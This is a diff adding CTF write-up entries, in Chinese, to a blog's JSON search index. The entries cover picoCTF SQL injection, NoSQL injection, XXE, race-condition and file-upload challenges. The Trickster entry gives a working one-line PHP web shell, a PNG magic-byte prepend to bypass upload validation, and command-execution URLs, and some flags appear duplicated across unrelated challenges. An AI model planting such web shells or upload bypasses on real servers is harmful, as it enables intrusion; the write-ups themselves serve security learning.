@@ -1,5 +1,35 @@
 [
   {
+    "objectID": "d23d35216cc2eef64b8d2f33b49ced71d84ddac8",
+    "permalink": "/post/findme/",
+    "title": "findme writeup","content": " 解題 打開題目 利用題目給我帳密登陸後.發現一行訊息 I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-) 這行訊息告訴我們過程中應改有什麼被忽略了,使用burp suite進行抓取封包查看,果然過程中有3個封包,且裡面有可疑的id,將其解析即可取得flag 取得flag\npicoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae} 提交flag ","date": "2026-05-05 15:50:52",
+    "updated": "2026-05-05 16:00:52"
+  }, 
+  {
+    "objectID": "6e9c84a446b06cd704980178daa452da05a72b9e",
+    "permalink": "/post/more_sqli/",
+    "title": "More SQLi writeup","content": " 解題 打開題目網頁 嘗試進行輸入帳密,發現查詢語句password竟然在前面 進行SQL Injection 取得flag 取得flag\npicoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae} 提交flag ","date": "2026-05-05 15:40:52",
+    "updated": "2026-05-05 15:45:52"
+  }, 
+  {
+    "objectID": "b07306a207192403b7619226561ca7fe1a70f3b2",
+    "permalink": "/post/soap/",
+    "title": "SOAP writeup","content": " What is XXE Injection? XXE（XML External Entity）注入是一種針對 XML 解析器的攻擊手法。XML 本身有個功能叫做實體（Entity），允許你定義「變數」來引用外部資源。\nXXE 攻擊就是利用這個功能，讓伺服器去讀取它不該暴露的東西。此攻擊能用於：\n讀取伺服器檔案：如 /etc/passwd、原始碼、設定檔 SSRF（伺服器端請求偽造）：讓伺服器去存取內網資源 阻斷服務（DoS）：用遞迴實體（Billion Laughs Attack）把記憶體吃光 資料外洩（OOB）：在沒有回顯的情況下，把資料送到攻擊者的伺服器 解題 打開題目網頁 使用burp suite進行抓取封包查看,發現他是用xml傳輸 修改封包嘗試進行xxe injection讀取/etc/passwd 取得flag\n取得flag\npicoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1} 提交flag 參考連結 https://portswigger.net/web-security/xxe\n","date": "2026-05-05 14:39:52",
+    "updated": "2026-05-05 15:38:52"
+  }, 
+  {
+    "objectID": "10fc8cd5b2162cac91eb7bce77cc2c974c6a6960",
+    "permalink": "/post/no_sql_injection/",
+    "title": "No Sql Injection writeup","content": " 解題 下載題目程式碼 觀察題目程式碼 發現有一個/admin的頁面 在server.js中發現伺服器資料庫使用mongo DB 在server.js中發現使用者帳號 在server.js中發現疑似把flag儲存在tocken中 在server.js中發現他將前端送出的帳號密碼直接串接成查詢語句,造成NoSql Injection 解題 打開題目網頁 嘗試直接/admin繞過登入進入頁面,雖然成功但沒找到任何有用的資訊 用burp suite對其進行抓取封包,並修改封包內容對其進行NoSql Injection 送出封包後發現進到amdin頁面,查看cookie時卻沒有tocken,該網頁沒有儲存 使用burp suite的repeater發送封包,查看詳細回傳了內容,發現tocken 此tocken疑似被base64編碼,對其解碼,獲取flag 取得flag\npicoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1} 提交flag ","date": "2026-05-05 13:00:52",
+    "updated": "2026-05-05 13:38:52"
+  }, 
+  {
+    "objectID": "dce11c647750e648533bfea03c67a92ad429d1a9",
+    "permalink": "/post/trickster/",
+    "title": "Trickster writeup","content": " Whis is magic number? Magic number 是放在檔案最開頭的一組固定位元組序列，作用就像檔案的「身分證」，讓作業系統或程式能快速辨識這個檔案到底是什麼類型，而不需要依賴副檔名。各種檔案格式的 magic number 如下：\n檔案格式 Magic Number (Hex) PDF 25 50 44 46 PNG 89 50 4E 47 0D 0A 1A 0A JPEG FF D8 FF ZIP (.docx, .xlsx 等) 50 4B 03 04 GIF 47 49 46 38 ELF (Linux 可執行檔) 7F 45 4C 46 Java .class CA FE BA BE 解題 開啟題目網頁 嘗試上傳隨意一張png圖片 看起來成功上傳了但我們沒辦法知道他上傳到哪裡,所以我們對其嘗試進行目錄爆破\ngobuster dir -u \u0026#34;http://atlas.picoctf.net:65515\u0026#34; -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 找到了一個可疑的路徑,嘗試連結發現是403,疑似上傳檔案存放的資料夾 嘗試在網址後面輸入我們剛剛上傳的檔名,發現是我們上傳的圖片 我們製作一個php並嘗試上傳\n\u0026lt;?=`$_GET[0]`?\u0026gt; Error: File name does not contain \u0026#39;.png\u0026#39;. 根據得到的錯誤訊息顯示黨名要包含.png，卻沒有特別說一定要加在檔名最後面,我們稍微修改檔名為rever.png.php再上傳看看 Error: The file is not a valid PNG image: 3c3f3d60 看起來有通過檔名驗證,但仍然被識別出來不是png上傳失敗,我們嘗試在php檔案裡加上png的magic number\nheader = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) with open(\u0026#34;rever.php\u0026#34;, \u0026#34;rb\u0026#34;) as f: data = f.read() with open(\u0026#34;rever.php\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(header + data) 再次上傳發現疑似成功上傳了 接著我們嘗試執行指令確認是否成功\nhttp://atlas.picoctf.net:56460/uploads/rever.png.php?0=id 成功後我們嘗試用ls尋找flag\nhttp://atlas.picoctf.net:56460/uploads/rever.png.php?0=ls http://atlas.picoctf.net:56460/uploads/rever.png.php?0=ls%20../ 發現一個奇怪檔案查看,取得flag\nhttp://atlas.picoctf.net:56460/uploads/rever.png.php?0=cat%20../GAZWIMLEGU2DQ.txt 取得flag\npicoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548} 提交flag ","date": "2026-05-05 12:00:52",
+    "updated": "2026-05-05 12:38:52"
+  }, 
+  {
     "objectID": "aa0b036654b82f7ac39b8b81b0be14e9760bbfa6",
     "permalink": "/post/pachinko/",
     "title": "Pachinko writeup","content": " What is race condition? Race Condition 是一種「時間差漏洞」。當系統在處理多個同時發生的請求時，因為步驟之間沒有做好鎖定（locking），就會產生邏輯錯誤。\n例如轉帳：假設你的錢包有 100 元，轉帳流程分三步：① 檢查餘額 → ② 送出錢 → ③ 扣除餘額。\n正常情況下，轉一次 100 元後餘額歸零，沒問題。但如果你同時發出兩個轉帳請求，事情就變了：\n請求 A 檢查餘額：100（通過）\n請求 B 檢查餘額：100（也通過，因為 A 還沒扣錢） 請求 A 送出 100 元\n請求 B 也送出 100 元\n扣款才開始執行……\n結果你只有 100 元，卻成功轉出了 200 元。這就是 Race Condition。\n解題 在模擬器上隨意連接一些邏輯閘 使用 Burp Suite 攔截送出的請求 使用 Burp Suite 的 Intruder 功能，以 Sniper 模式大量重送同一個請求 因為伺服器沒有對並行請求做好防護，觸發Race Condition，伺服器回傳flag 取得flag\npicoCTF{D0nt_Use_Unsecure_f@nctionsba15f0f7} 提交flag ","date": "2026-05-04 11:54:52",
